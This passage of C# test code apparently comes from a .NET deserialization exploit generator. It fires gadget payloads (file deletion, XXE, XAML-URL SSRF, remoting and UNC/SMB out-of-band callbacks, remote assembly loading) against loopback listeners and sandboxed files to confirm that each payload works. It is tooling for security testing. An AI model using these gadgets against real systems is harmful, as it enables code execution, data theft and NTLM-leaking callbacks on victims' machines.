            if (FireFileOpsCell(4, source + ";" + dest, formatter, container, minify, label, failures))
            {
                if (Directory.Exists(source))
                    failures.Add("fire " + label + ": the source directory was not moved away");
                else if (!File.Exists(Path.Combine(dest, "inside.txt")))
                    failures.Add("fire " + label + ": the moved directory does not carry its child file");
                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
            }
            SafeDeleteDir(source); SafeDeleteDir(dest);
        }

        private static void FireFileOpsEmpty(string root, string stem, string formatter,
            int container, bool minify, string cell, List<string> failures, ref int fired)
        {
            string label = "TCDFileOps empty" + cell;
            string target = Path.Combine(root, "zz_empty_" + stem + ".txt");
            SafeDelete(target);
            // Pre-create it with content, so this also proves the TRUNCATE half, not just
            // the create half.
            File.WriteAllText(target, "this content must be truncated away");
            if (FireFileOpsCell(5, target, formatter, container, minify, label, failures))
            {
                if (!File.Exists(target))
                    failures.Add("fire " + label + ": the target file is missing");
                else if (new FileInfo(target).Length != 0)
                    failures.Add("fire " + label + ": the existing file was not truncated to zero bytes");
                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
            }
            SafeDelete(target);
        }

        // Every TempFileCollection cell, fired for real: 4 formatters x minify off/on x the
        // two cleanup paths the framework offers (the finalizer and an explicit Dispose), so
        // 16 cells. No marker command and no spawned process - the deserialized object deletes
        // the file itself - so the assertion is synchronous and needs no wall-clock budget.
        //
        // Every payload names exactly ONE file inside this test's own directory. A sentinel
        // file sits next to it and must survive, which is what proves the payload deletes what
        // it was given and nothing else.
        private static void FireTempFileCollectionDeletes(List<string> failures, ref int fired, bool trace)
        {
            string root = TestArtifactPath("ysonet_tfc_fire");
            SafeDeleteDir(root);
            Directory.CreateDirectory(root);
            try
            {
                foreach (string formatter in TempFilesFormatters)
                {
                    foreach (bool minify in new[] { false, true })
                    {
                        string stem = TempFilesDeserTag(formatter) + (minify ? "_min" : "");
                        FireTempFilesCell(root, stem, formatter, minify, true, failures, ref fired, trace);
                        FireTempFilesCell(root, stem, formatter, minify, false, failures, ref fired, trace);
                    }
                }
            }
            finally { SafeDeleteDir(root); }
        }

        private static void FireTempFilesCell(string root, string stem, string formatter,
            bool minify, bool viaFinalizer, List<string> failures, ref int fired, bool trace)
        {
            string label = TempFilesGadget + " -f " + formatter + (minify ? " --minify" : "")
                + (viaFinalizer ? " (finalizer)" : " (Dispose)");
            string suffix = stem + (viaFinalizer ? "_gc" : "_dispose");
            string target = Path.Combine(root, "target_" + suffix + ".txt");
            string sentinel = Path.Combine(root, "sentinel_" + suffix + ".txt");
            if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }
            try
            {
                File.WriteAllText(target, "this file must be deleted by the payload");
                File.WriteAllText(sentinel, "this file must survive");

                // Only the target path goes into the payload. Never the sentinel, and never
                // anything outside root.
                RunResult r = GenerateTempFiles(formatter, minify, false, target);
                if (!r.Success)
                {
                    failures.Add("fire " + label + ": generation failed: " + r.ErrorMessage);
                    return;
                }

                if (viaFinalizer)
                {
                    // The deserialized object must become unreachable for its finalizer to
                    // run, so the deserialize happens in a separate non-inlined frame that
                    // returns ONLY a WeakReference. A dead weak reference afterwards is what
                    // makes the deletion attributable to the finalizer.
                    WeakReference weak = DeserializeTempFileCollectionAndDrop(formatter, r.Raw);
                    GC.Collect();
                    GC.WaitForPendingFinalizers();
                    GC.Collect();
                    if (weak.IsAlive)
                    {
                        failures.Add("fire " + label + ": the deserialized object was still "
                            + "reachable after a full collection, so its finalizer never ran");
                        return;
                    }
                }
                else
                {
                    DisposeDeserializedTempFileCollection(formatter, r.Raw);
                }

                if (File.Exists(target))
                    failures.Add("fire " + label + ": the target file was not deleted");
                else if (!File.Exists(sentinel))
                    failures.Add("fire " + label + ": the sentinel file was deleted too, so the "
                        + "payload removed more than the one path it was given");
                else { fired++; RuntimeBuild.RecordFired(TempFilesGadget); }
            }
            catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
            finally { SafeDelete(target); SafeDelete(sentinel); }
        }

        // Deserialize the payload and let the object go, returning only a WeakReference to it.
        // NoInlining keeps the caller from holding a live reference in its own frame, which
        // would keep the object off the finalizer queue and make the cell look like a payload
        // that did not fire.
        [System.Runtime.CompilerServices.MethodImpl(
            System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
        private static WeakReference DeserializeTempFileCollectionAndDrop(string formatter, object raw)
        {
            return new WeakReference(DeserializeTempFileCollection(formatter, raw));
        }

        // The deterministic half of the same effect: IDisposable.Dispose reaches the same
        // Delete() and then suppresses the finalizer itself, so nothing is left queued.
        [System.Runtime.CompilerServices.MethodImpl(
            System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
        private static void DisposeDeserializedTempFileCollection(string formatter, object raw)
        {
            object obj = DeserializeTempFileCollection(formatter, raw);
            IDisposable disposable = obj as IDisposable;
            if (disposable == null)
                throw new Exception("the deserialized " + (obj == null ? "null" : obj.GetType().Name)
                    + " is not IDisposable");
            disposable.Dispose();
        }

        private static object DeserializeTempFileCollection(string formatter, object raw)
        {
            switch (TempFilesDeserTag(formatter))
            {
                case "bf": return SerializersHelper.BinaryFormatter_deserialize(Bytes(raw));
                case "soap": return SerializersHelper.SoapFormatter_deserialize(Text(raw));
                case "los": return SerializersHelper.LosFormatter_deserialize(Bytes(raw));
                case "ndc": return SerializersHelper.NetDataContractSerializer_deserialize(Text(raw));
                // Plain DataContractSerializer carries no type information, so the root type
                // travels in the project's <root type="..."> envelope and the consumer reads it
                // from there - exactly what a real target does with its own fixed root type.
                case "dcs": return SerializersHelper.DataContractSerializer_deserialize(
                    Text(raw), null, "root", "type");
                default: throw new Exception("no deserializer for " + formatter);
            }
        }

        // FileLogTraceListener's effect is a created DIRECTORY, so the sink is a temp
        // dir under the test artifact folder rather than a marker file. The gadget's
        // own self-test (inputArgs.Test) does the deserialize, exactly as the CLI
        // would with -t, and the directory is removed again in the finally.
        private static void FireFileLogTraceListenerTempDir(string formatter, bool minify,
            List<string> failures, ref int fired, bool trace)
        {
            string label = "FileLogTraceListener " + formatter + (minify ? " --minify" : "");
            string dir = TestArtifactPath("ysonet_firedir_" + formatter.Replace(".", "") + (minify ? "_min" : ""));
            SafeDeleteDir(dir);
            if (trace) { Console.Error.WriteLine("    [fire] " + label + " (tempdir)"); Console.Error.Flush(); }
            try
            {
                InputArgs input = new InputArgs();
                input.Cmd = dir;
                input.Minify = minify;
                input.Test = true;
                RunResult result = null;
                RunSTA(delegate
                {
                    result = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = "FileLogTraceListener",
                        FormatterName = formatter,
                        InputArgs = input,
                    });
                });
                if (result == null || !result.Success)
                {
                    failures.Add("fire " + label + ": generation failed: "
                        + (result == null ? "no result" : result.ErrorMessage));
                    return;
                }
                if (WaitForDir(dir, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired("FileLogTraceListener"); }
                else failures.Add("fire " + label + ": directory not created");
            }
            catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
            finally { SafeDeleteDir(dir); }
        }

        // AssemblyInstallerLoad's effect is the operator's DLL being loaded and its
        // [RunInstaller(true)] classes constructed. The test-owned DLL is the already-built
        // ysonet.Tests assembly itself (InstallerFixture.cs), whose installer constructor
        // appends one line to a marker only when YSONET_INSTALLER_MARKER names one. So the
        // sink is a marker file this process writes SYNCHRONOUSLY during the deserialize -
        // no spawned process, so no polling budget is needed.
        //
        // The gadget refuses -t, so the payload is generated with Test off and deserialized
        // here. RunSTA because the WinForms carriers want an STA thread, and because a
        // carrier can throw AFTER the getter has already run.
        //
        // LINE COUNT, not existence: AssemblyInstaller sets its private "initialized" flag
        // at the end of the first InitializeFromAssembly, so even ComboBox - which reads
        // HelpText more than once - must construct the installer exactly ONCE. A payload
        // that ran the operator's code twice would be a real defect.
        private static void FireAssemblyInstallerLoad(string formatter, string deserAs, int getter,
            bool minify, List<string> failures, ref int fired, bool trace)
        {
            if (RefuseToFireDosGadget("AssemblyInstallerLoad", failures)) return;
            string label = "AssemblyInstallerLoad " + formatter + " g" + getter + (minify ? " --minify" : "");
            if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }

            string marker = TestArtifactPath("ysonet_installer_"
                + formatter.Replace(".", "") + "_g" + getter + (minify ? "_min" : "") + ".txt");
            SafeDelete(marker);
            string previous = Environment.GetEnvironmentVariable(YsonetTestInstaller.MarkerVariable);
            Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, marker);
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = AiFixtureAssemblyPath();
                ia.Minify = minify;
                ia.Test = false;   // the gadget refuses -t; the deserialize below is the effect
                ia.ExtraArguments = new List<string> { "--variant", "1", "--getter", getter.ToString() };

                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "AssemblyInstallerLoad",
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = ia,
                });
                if (r == null || !r.Success)
                {
                    failures.Add("fire " + label + ": generation failed: "
                        + (r == null ? "no result" : r.ErrorMessage));
                    return;
                }

                RunSTA(delegate { DeserializeAs(deserAs, r.Raw); });

                if (!File.Exists(marker))
                {
                    failures.Add("fire " + label + ": the installer was never constructed");
                    return;
                }

                int runs = 0;
                foreach (string line in File.ReadAllLines(marker))
                    if (line.Trim() == YsonetTestInstaller.MarkerLine) runs++;

                if (runs != 1)
                {
                    failures.Add("fire " + label + ": the installer ran " + runs
                        + " times; the AssemblyInstaller 'initialized' flag must limit it to 1");
                    return;
                }

                fired++;
                RuntimeBuild.RecordFired("AssemblyInstallerLoad");
            }
            catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
            finally
            {
                Environment.SetEnvironmentVariable(YsonetTestInstaller.MarkerVariable, previous);
                SafeDelete(marker);
            }
        }

        // Gadget formatter -> the deserializer tag DeserializeAs uses for it.
        private static readonly string[][] AssemblyInstallerFireRows = new string[][]
        {
            new string[] { "Json.NET", "json" },
            new string[] { "Xaml", "xaml" },
            new string[] { "FastJson", "fastjson" },
            new string[] { "JavaScriptSerializer", "jss" },
            new string[] { "YamlDotNet", "yaml" },
            new string[] { "SharpSerializerXml", "ssx" },
            new string[] { "SharpSerializerBinary", "ssb" },
            new string[] { "MessagePackTypeless", "mp" },
            new string[] { "MessagePackTypelessLz4", "mplz4" },
        };

        private static void FireNetNonRceListener(string gadget, string formatter, List<string> failures, ref int fired, bool trace)
        {
            FireNetNonRceListener(gadget, formatter, false, failures, ref fired, trace);
        }

        private static void FireNetNonRceListener(string gadget, string formatter, bool minify, List<string> failures, ref int fired, bool trace)
        {
            string label = gadget + " " + formatter + (minify ? " --minify" : "");
            if (trace) { Console.Error.WriteLine("    [fire] " + label + " (listener)"); Console.Error.Flush(); }
            using (var listener = new LoopbackListener())
            {
                try
                {
                    InputArgs input = new InputArgs();
                    input.Cmd = listener.HttpUrl;
                    input.Minify = minify;
                    input.Test = true;
                    RunResult result = null;
                    RunSTA(delegate
                    {
                        result = PayloadRunner.GenerateGadget(new GenerationRequest
                        {
                            GadgetName = gadget,
                            FormatterName = formatter,
                            InputArgs = input,
                        });
                    });
                    if (result == null || !result.Success)
                    {
                        failures.Add("fire " + label + ": generation failed: "
                            + (result == null ? "no result" : result.ErrorMessage));
                        return;
                    }
                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired(gadget); }
                    else failures.Add("fire " + label + ": listener not hit");
                }
                catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
            }
        }

        // DataViewManagerXxe cannot fire in the test process: its effect depends on the
        // PRE-4.5.2 XML resolver default, and System.Xml decides that once per process from
        // the entry assembly's target framework (see ysonet.Tests/LegacyXmlChild.cs). So
        // generate here, deserialize in a child stamped with the moniker under test, and let
        // the loopback listener in THIS process decide whether the DTD was fetched.
        //
        // legacy=true is the positive case (the request must arrive); legacy=false is the
        // hardened-default control (it must NOT), which is what stops a false positive from
        // some other component fetching the URL.
        private static void FireDataViewManagerXxe(string formatter, bool minify, bool legacy,
            List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            string label = "DataViewManagerXxe " + formatter + (minify ? " --minify" : "")
                + (legacy ? " [legacy 4.5.1]" : " [hardened 4.7.2]");
            if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }

            string moniker = legacy ? LegacyXmlChild.LegacyMoniker : LegacyXmlChild.HardenedMoniker;
            string childExe = LegacyXmlChild.EnsureBuilt(moniker);
            if (childExe == null)
            {
                skipped++;
                Console.WriteLine("  [SKIP] fire " + label + ": cannot build the legacy XML child on this machine ("
                    + LegacyXmlChild.LastError + ")");
                return;
            }

            string payloadFile = TestArtifactPath("ysonet_fire_dvmxxe_"
                + formatter + (minify ? "_min" : "") + (legacy ? "_legacy" : "_hardened") + ".bin");
            SafeDelete(payloadFile);

            using (var listener = new LoopbackListener())
            {
                try
                {
                    InputArgs input = new InputArgs();
                    input.Cmd = listener.HttpUrl + ".dtd";
                    input.Minify = minify;
                    input.Test = false;   // the effect must come from the CHILD, not from here

                    RunResult result = PayloadRunner.GenerateGadget(new GenerationRequest
                    {
                        GadgetName = "DataViewManagerXxe",
                        FormatterName = formatter,
                        InputArgs = input,
                    });
                    if (result == null || !result.Success)
                    {
                        failures.Add("fire " + label + ": generation failed: "
                            + (result == null ? "no result" : result.ErrorMessage));
                        return;
                    }

                    byte[] payloadBytes = result.Raw as byte[];
                    if (payloadBytes == null)
                    {
                        string payloadText = result.Raw as string;
                        if (payloadText == null)
                        {
                            failures.Add("fire " + label + ": unexpected payload type "
                                + (result.Raw == null ? "null" : result.Raw.GetType().Name));
                            return;
                        }
                        payloadBytes = new UTF8Encoding(false).GetBytes(payloadText);
                    }
                    File.WriteAllBytes(payloadFile, payloadBytes);

                    string childOutput = LegacyXmlChild.Run(childExe, formatter, payloadFile, 60000);

                    // The child must actually have had the resolver default we asked for. A
                    // silent flip here would turn the whole matrix into a no-op that passes.
                    string wanted = legacy ? "legacyXml=True" : "legacyXml=False";
                    if (childOutput.IndexOf(wanted, StringComparison.Ordinal) < 0)
                    {
                        failures.Add("fire " + label + ": child did not report " + wanted
                            + "; output was: " + childOutput.Trim());
                        return;
                    }

                    bool hit = listener.Fired(legacy ? MarkerWaitMs : 2000);
                    if (legacy)
                    {
                        if (hit) { fired++; RuntimeBuild.RecordFired("DataViewManagerXxe"); }
                        else
                            failures.Add("fire " + label + ": no DTD request arrived. child output: "
                                + childOutput.Trim());
                    }
                    else
                    {
                        if (hit)
                            failures.Add("fire " + label
                                + ": a DTD request arrived under the HARDENED default, which must not happen");
                        else fired++;
                    }
                }
                catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
                finally { SafeDelete(payloadFile); }
            }
        }

        private static void FireOdpXamlUrlListener(List<string> failures, ref int fired, bool trace)
        {
            if (trace) { Console.Error.WriteLine("    [fire] ObjectDataProvider v3 xamlurl (listener)"); Console.Error.Flush(); }
            using (var listener = new LoopbackListener())
            {
                try
                {
                    InputArgs ia = new InputArgs();
                    ia.Cmd = "calc.exe"; // ignored by variant 3
                    ia.Test = false;
                    ia.ExtraArguments = new List<string> { "--variant", "3", "--xamlurl", listener.HttpUrl };
                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = "ObjectDataProvider",
                        FormatterName = "Xaml",
                        OutputFormat = "",
                        InputArgs = ia,
                    };
                    RunResult r = PayloadRunner.GenerateGadget(req);
                    if (!r.Success || !(r.Raw is string)) { failures.Add("fire ObjectDataProvider v3: generate -> " + (r.Success ? "not string" : r.ErrorMessage)); return; }
                    RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired("ObjectDataProvider"); }
                    else failures.Add("fire ObjectDataProvider v3 (xamlurl SSRF): listener not hit");
                }
                catch (Exception ex) { failures.Add("fire ObjectDataProvider v3: " + ex.Message); }
            }
        }

        // ObjRef makes an outbound .NET Remoting call to the -c URL on deserialize, but the
        // runtime only emits it when a matching client channel is registered (process-global).
        // Best-effort: register a client channel, fire, capture the connection, unregister.
        private static void FireObjRefListener(List<string> failures, ref int fired, ref int skipped, bool trace)
        {
            if (trace) { Console.Error.WriteLine("    [fire] ObjRef remoting (listener, best-effort)"); Console.Error.Flush(); }
            System.Runtime.Remoting.Channels.IChannel channel = null;
            using (var listener = new LoopbackListener())
            {
                try
                {
                    channel = new System.Runtime.Remoting.Channels.Tcp.TcpClientChannel(
                        "ysonet_objref_" + listener.Port, null);
                    System.Runtime.Remoting.Channels.ChannelServices.RegisterChannel(channel, false);

                    InputArgs ia = new InputArgs();
                    ia.Cmd = listener.TcpUrl;
                    ia.Test = false;
                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = "ObjRef",
                        FormatterName = "BinaryFormatter",
                        OutputFormat = "",
                        InputArgs = ia,
                    };
                    RunResult r = PayloadRunner.GenerateGadget(req);
                    if (!r.Success || !(r.Raw is byte[]))
                    {
                        skipped++;
                        Console.Error.WriteLine("  [skip] fire ObjRef: generate -> " + (r.Success ? "not byte[]" : r.ErrorMessage));
                        return;
                    }
                    RunSTA(delegate { SerializersHelper.BinaryFormatter_deserialize((byte[])r.Raw); });
                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired("ObjRef"); }
                    else { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: listener not hit (remoting client channel did not emit)"); }
                }
                catch (Exception ex) { skipped++; Console.Error.WriteLine("  [skip] fire ObjRef: " + ex.Message); }
                finally
                {
                    if (channel != null)
                        try { System.Runtime.Remoting.Channels.ChannelServices.UnregisterChannel(channel); } catch { }
                }
            }
        }

        // ---- 6.4 out-of-band callback observation (OOB tier) -------------------
        //
        // Some effects cannot be observed in process. The SMB/UNC callback is the case
        // that forced this: the effect is an outbound SMB connection made by
        // Win32Native.GetLongPathNameW while normalizing a path, SMB is fixed at port
        // 445, and the Windows SMB client owns the loopback UNC path, so LoopbackListener
        // (an ephemeral TCP port) cannot see it.
        //
        // What makes it testable anywhere: Windows must RESOLVE the host name before it
        // can open the SMB connection. A recorded DNS query for a host name only this run
        // knows is proof that the callback was attempted, and DNS gets out even when
        // outbound 445 is blocked by a firewall or an ISP. So a DNS interaction is a
        // positive result with or without a completed SMB session.
        //
        // The observation endpoint is interactsh (OobSession in Oob.cs). Nothing here
        // runs unless the maintainer passes --oob / sets YSONET_OOB_TESTS, no host name
        // is hardcoded in the repo (the client mints one per run), and
        // YSONET_INTERACTSH_SERVER points the whole thing at a self-hosted server.

        // The server is polled once a second, and a DNS query has to travel through the
        // machine's resolver chain first, so allow a generous ceiling. A healthy run
        // reports in a few seconds; the ceiling is only paid when nothing calls out.
        private const int OobWaitMs = 60000;

        // How long to let the control case call out before concluding it did not. It is
        // issued at the same time as the positive case, which has already been waited
        // for, so this is only a settling margin.
        private const int OobControlSettleMs = 10000;

        // Gadgets that reach a host over UNC/SMB, so an out-of-band interaction is the only
        // honest proof the target really called out. Columns:
        //   0 gadget name
        //   1 formatter
        //   2 deserializer tag for DeserializeAs
        //   3 extra CLI arguments, space separated ("" for none)
        //   4 UNC path shape: "shortname" for the 8.3 expansion trigger
        //     (\\host\share\aaaaaa~1\x), "dll" for a loadable assembly path
        //     (\\host\share\payload.dll)
        // A row whose gadget is not registered yet logs a skip naming it, so this workflow
        // is ready the day the gadget lands (see
        // dev-kitchen/ideas/gadget-filesysteminfo-smb-callback.md).
        //
        // What a hit proves and what it does not: a DNS query for the run-unique host proves
        // the target ATTEMPTED the callback. It is not proof of a completed SMB session, of
        // NTLM authentication, or - for AssemblyInstallerLoad - of a successfully loaded
        // remote assembly, which additionally needs the share in a zone the target trusts.
        private static readonly string[][] UncCallbackRows = new string[][]
        {
            new string[] { "FileSystemInfo", "BinaryFormatter", "bf", "", "shortname" },
            // Variant 2 is the UNC variant, and the path has to end in .dll because the
            // gadget refuses anything else (Assembly.LoadFrom is the sink).
            new string[] { "AssemblyInstallerLoad", "Json.NET", "json", "--variant 2", "dll" },
        };

        // Prove the observation mechanism and the trigger shape in one run, with a
        // control that makes the positive result mean something.
        private static void UncShortNameExpansionIsObservedOutOfBand()
        {
            string reason;
            using (OobSession oob = OobSession.TryStart(ResolveTestArtifactDir(), out reason))
            {
                if (oob == null) { Console.Error.WriteLine("  [skip] out-of-band: " + reason); return; }
                Console.Error.WriteLine("  [oob] endpoint: " + oob.ServerDescription);

                string label = oob.NewLabel("unc");
                string control = oob.NewLabel("plain");

                // Path.GetFullPath is the same framework entry point the gadget reaches:
                // FileSystemInfo's deserialization constructor calls
                // Path.GetFullPathInternal, which normalizes and expands the short name.
                NormalizeIgnoringErrors(oob.ShortNameUncPath(label));
                NormalizeIgnoringErrors(oob.PlainUncPath(control));

                string protocols;
                bool hit = oob.Observed(label, OobWaitMs, out protocols);
                AssertTrue(hit, "no out-of-band interaction for " + oob.HostFor(label) + " within "
                    + (OobWaitMs / 1000) + "s: the short-name UNC path did not call out");
                Console.Error.WriteLine("  [oob] short-name UNC observed over: " + protocols);

                // Control. The same host shape WITHOUT a "~" component must not be looked
                // up at all: mscorlib only calls GetLongPathNameW when a path component
                // holds a "~" and is 12 characters or fewer. Without this check, a hit
                // above would not prove the short-name expansion caused it.
                System.Threading.Thread.Sleep(OobControlSettleMs);
                string controlProtocols = oob.ProtocolsFor(control);
                AssertEqual("", controlProtocols, "a plain UNC path (no short-name component) must not"
                    + " call out; it did, so the positive result above does not isolate the expansion"
                    + " (host " + oob.HostFor(control) + ")");
            }
        }

        // The runtime effect coverage for every UNC/SMB callback gadget.
        private static void UncCallbackGadgetsAreObservedOutOfBand()
        {
            var failures = new List<string>();
            int fired = 0, skipped = 0;
            bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
            string reason;
            using (OobSession oob = OobSession.TryStart(ResolveTestArtifactDir(), out reason))
            {
                if (oob == null) { Console.Error.WriteLine("  [skip] out-of-band: " + reason); return; }
                Console.Error.WriteLine("  [oob] endpoint: " + oob.ServerDescription);
                foreach (string[] row in UncCallbackRows)
                {
                    if (!GadgetIsRegistered(row[0]))
                    {
                        skipped++;
                        Console.Error.WriteLine("  [skip] fire " + row[0] + ": gadget is not registered yet");
                        continue;
                    }
                    FireUncCallbackGadget(oob, row[0], row[1], row[2], row[3], row[4],
                        failures, ref fired, trace);
                }
            }
            Console.Error.WriteLine("  [oob] gadgets observed: " + fired + ", skipped: " + skipped);
            if (failures.Count > 0)
                throw new Exception(string.Join("; ", failures.ToArray()));
        }

        // Generate a UNC-callback gadget's payload pointed at a run-unique host under the
        // OOB domain, deserialize it in process, and wait for the interaction.
        private static void FireUncCallbackGadget(OobSession oob, string gadget, string formatter,
            string deserAs, string extraArgs, string pathShape, List<string> failures, ref int fired, bool trace)
        {
            if (RefuseToFireDosGadget(gadget, failures)) return;
            string label = oob.NewLabel(gadget.ToLowerInvariant());
            string uncPath = pathShape == "dll" ? oob.UncDllPath(label) : oob.ShortNameUncPath(label);
            if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " -> " + uncPath); Console.Error.Flush(); }
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = uncPath;
                ia.Test = false; // the gadget's own self-test must not make THIS machine call out
                if (!string.IsNullOrEmpty(extraArgs))
                    ia.ExtraArguments = new List<string>(
                        extraArgs.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries));
                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = gadget,
                    FormatterName = formatter,
                    OutputFormat = "",
                    InputArgs = ia,
                });
                if (!r.Success)
                {
                    failures.Add("fire " + gadget + " (" + formatter + "): generate -> " + r.ErrorMessage);
                    return;
                }
                RunSTA(delegate { DeserializeAs(deserAs, r.Raw); });

                string protocols;
                if (oob.Observed(label, OobWaitMs, out protocols))
                {
                    fired++;
                    RuntimeBuild.RecordFired(gadget);
                    Console.Error.WriteLine("  [oob] " + gadget + " (" + formatter + ") observed over: " + protocols);
                }
                else
                {
                    failures.Add("fire " + gadget + " (" + formatter + "): no out-of-band interaction for "
                        + oob.HostFor(label) + " within " + (OobWaitMs / 1000) + "s");
                }
            }
            catch (Exception ex) { failures.Add("fire " + gadget + " (" + formatter + "): " + ex.Message); }
        }

        // Normalize a UNC path the way FileSystemInfo's deserialization constructor does.
        // It can throw AFTER the connection attempt (the host answers nothing useful),
        // and the attempt is what is being measured, so the exception is not interesting.
        private static void NormalizeIgnoringErrors(string path)
        {
            try { Path.GetFullPath(path); } catch { }
        }

        private static bool GadgetIsRegistered(string gadget)
        {
            try { return GadgetRegistry.CreateGadgetInstance(gadget) != null; }
            catch { return false; }
        }

        private static bool WaitForDir(string path, int totalMs)
        {
            int waited = 0;
            while (waited < totalMs)
            {
                if (Directory.Exists(path)) return true;
                System.Threading.Thread.Sleep(100);
                waited += 100;
            }
            return Directory.Exists(path);
        }

        // ---- helpers -----------------------------------------------------------

        // Drive the wizard with a scripted key source and return the bytes written
        // to the stdout stream. Captured stderr (prompts, menus, echo) is returned
        // too. All input (menus and free text) comes through the key reader.
        private static byte[] DriveWizard(IKeyReader keys, out string stderr)
        {
            var payload = new MemoryStream();
            TextWriter savedErr = Console.Error;
            StringWriter err = new StringWriter();
            Console.SetError(err);
            ModuleEditor.ForceFallback = true; // drive the deterministic single-panel path
            try
            {
                Wizard w = new Wizard(keys, payload);
                w.Run();
            }
            finally
            {
                Console.SetError(savedErr);
            }
            stderr = err.ToString();
            return payload.ToArray();
        }

        // Run an interactive widget while swallowing its stderr rendering.
        private static T WithSwallowedError<T>(Func<T> action)
        {
            TextWriter savedErr = Console.Error;
            Console.SetError(new StringWriter());
            try { return action(); }
            finally { Console.SetError(savedErr); }
        }


        private static byte[] GenerateOdpJson(string cmd)
        {
            return GenerateOdpJson(cmd, false);
        }

        private static byte[] GenerateOdpJson(string cmd, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Minify = minify;
            GenerationRequest req = new GenerationRequest();
            req.GadgetName = "ObjectDataProvider";
            req.FormatterName = "Json.NET";
            req.OutputFormat = "";
            req.InputArgs = ia;
            RunResult r = PayloadRunner.GenerateGadget(req);
            if (!r.Success)
                throw new Exception("core generation failed: " + r.ErrorMessage);
            int len;
            return PayloadRunner.Encode(r.Raw, r.EffectiveOutputFormat, out len);
        }

        private static OptionField FindField(List<OptionField> fields, string name)
        {
            foreach (OptionField f in fields)
                if (string.Equals(f.Name, name, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static bool BytesEqual(byte[] a, byte[] b)
        {
            if (a == null || b == null) return a == b;
            if (a.Length != b.Length) return false;
            for (int i = 0; i < a.Length; i++)
                if (a[i] != b[i]) return false;
            return true;
        }

        private static void Run(string name, Action test)
        {
            try
            {
                test();
                _passed++;
                Console.Error.WriteLine("[PASS] " + name);
            }
            catch (Exception e)
            {
                _failed++;
                Console.Error.WriteLine("[FAIL] " + name + " -> " + e.Message);
            }
        }

        private static void AssertTrue(bool cond, string msg)
        {
            if (!cond)
                throw new Exception("expected true: " + msg);
        }

        private static void AssertEqual(object expected, object actual, string msg)
        {
            if (!object.Equals(expected, actual))
                throw new Exception(msg + " (expected '" + expected + "', got '" + actual + "')");
        }

        // ---- Denial-of-service policy tests ------------------------------------
        //
        // The category is facet-driven: a gadget is a DoS gadget when its facets
        // declare denial-of-service, on the gadget or on one variant. No gadget
        // declares it yet, so the registry-driven parts below are written to become
        // live the moment one does, and the pure policy is proved here with fakes
        // from DosFakes.cs (kept out of the catalogue by the TestingArena rule).

        private static void DosPolicyDetectsVariantLevelFacet()
        {
            IGenerator dos = new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator();
            IGenerator variantDos = new ysonet.Tests.Helpers.TestingArena.DosVariantFakeGenerator();
            IGenerator safe = new ysonet.Tests.Helpers.TestingArena.SafeFakeGenerator();

            AssertTrue(DosPolicy.IsDosGadget(dos), "a gadget-level facet is detected");
            AssertTrue(DosPolicy.IsDosGadget(variantDos), "a DoS in one variant makes the whole gadget DoS");
            AssertTrue(!DosPolicy.IsDosGadget(safe), "an ordinary gadget is not DoS");
            AssertTrue(!DosPolicy.IsDosGadget((IGenerator)null), "a null gadget is not DoS");
            AssertTrue(!DosPolicy.IsDosGadget("NoSuchGadget"), "an unknown name is not DoS");

            // The fakes must stay invisible to the catalogue; otherwise they would
            // join every gadget list, help screen, and generation matrix.
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
                AssertTrue(name != "DosFake" && name != "DosVariantFake" && name != "SafeFake",
                    "test fakes are not registered gadgets (found " + name + ")");
        }

        private static void DosPolicyAgreesWithFacetExpansion()
        {
            // DosPolicy reads the facets directly instead of calling
            // GadgetFacetReader.Expand, so a metadata mistake fails the metadata
            // tests rather than breaking every generation. This keeps the two
            // readings in step for every real gadget and for the fakes.
            var subjects = new List<IGenerator>();
            foreach (string name in GadgetRegistry.GetAllGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g != null) subjects.Add(g);
            }
            subjects.Add(new ysonet.Tests.Helpers.TestingArena.DosFakeGenerator());
            subjects.Add(new ysonet.Tests.Helpers.TestingArena.DosVariantFakeGenerator());
            subjects.Add(new ysonet.Tests.Helpers.TestingArena.SafeFakeGenerator());
            AssertTrue(subjects.Count > 3, "found gadgets to compare");

            foreach (IGenerator g in subjects)
            {
                bool viaExpansion = false;
                foreach (GadgetCapability cap in GadgetFacetReader.Expand(g))
                    if (cap.Kinds.Contains(PayloadKind.DenialOfService))
                        viaExpansion = true;
                AssertEqual(viaExpansion, DosPolicy.IsDosGadget(g),
                    "the two DoS readings agree for " + g.Name());
            }
        }

        private static void DosRefusalMessageNamesTheFlag()
